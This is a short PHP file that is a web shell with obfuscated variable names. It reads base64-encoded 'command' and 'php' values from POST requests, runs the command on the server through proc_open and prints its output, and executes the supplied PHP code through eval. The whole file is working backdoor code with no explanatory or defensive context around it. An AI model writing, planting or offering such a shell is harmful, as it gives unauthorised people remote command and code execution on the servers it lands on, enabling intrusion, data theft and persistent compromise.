<?php

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $c1dccadfed7bc = $_POST["command"];
    $ye1bfd762321e = $_POST["php"];
    $c1dccadfed7bc = strtr($c1dccadfed7bc, "-", "=");
    $c1dccadfed7bc = base64_decode($c1dccadfed7bc);
    $ye1bfd762321e = strtr($ye1bfd762321e, "-", "=");
    $ye1bfd762321e = base64_decode($ye1bfd762321e);
    if ($c1dccadfed7bc) {
        $k1ebe3f3e4e46 = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
        $w5075140835d0 = proc_open($c1dccadfed7bc, $k1ebe3f3e4e46, $s24a9384d408f);
        if (is_resource($w5075140835d0)) {
            $u78e6221f6393 = '';
            while (($tc68271a63ddb = fgets($s24a9384d408f[1])) !== false) {
                $u78e6221f6393 .= $tc68271a63ddb;
            }
            while (($q56bd7107802e = fgets($s24a9384d408f[2])) !== false) {
                $u78e6221f6393 .= $q56bd7107802e;
            }
            fclose($s24a9384d408f[0]);
            fclose($s24a9384d408f[1]);
            fclose($s24a9384d408f[2]);
            proc_close($w5075140835d0);
            echo "<pre>";
            echo $u78e6221f6393;
            echo "</pre>";
        } else {
            echo "Error executing command";
        }
    }
    if ($ye1bfd762321e) {
        $eb4a88417b3d0 = eval($ye1bfd762321e);
        echo $eb4a88417b3d0;
    }
}
?> 

